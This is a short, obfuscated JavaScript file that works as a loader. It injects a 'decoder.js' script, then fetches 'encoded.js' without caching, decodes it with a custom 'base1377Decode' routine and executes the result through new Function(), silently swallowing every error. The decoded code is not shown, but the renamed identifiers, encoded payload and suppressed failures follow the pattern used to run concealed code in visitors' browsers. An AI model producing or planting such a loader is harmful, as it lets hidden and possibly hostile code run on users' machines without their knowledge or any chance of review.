(function () {
  function _0x30bde6(_0x3bfce3) {
    const _0x1e3a66 = document.createElement('script');
    _0x1e3a66.src = 'decoder.js';
    _0x1e3a66.onload = () => {
      if (typeof base1377Decode === 'function') {
        _0x3bfce3();
      }
    };
    _0x1e3a66.onerror = () => {};
    document.head.appendChild(_0x1e3a66);
  }
  function _0x401015() {
    fetch('encoded.js', {
      'cache': 'no-store'
    }).then(_0x158838 => {
      if (!_0x158838.ok) {
        return;
      }
      return _0x158838.text();
    }).then(_0x21808f => {
      if (!_0x21808f) {
        return;
      }
      const _0x2734f5 = base1377Decode(_0x21808f.trim());
      if (_0x2734f5) {
        try {
          new Function(_0x2734f5)();
        } catch (_0x5b7b8c) {}
      }
    })['catch'](() => {});
  }
  _0x30bde6(() => {
    setTimeout(_0x401015, 0x320);
  });
})();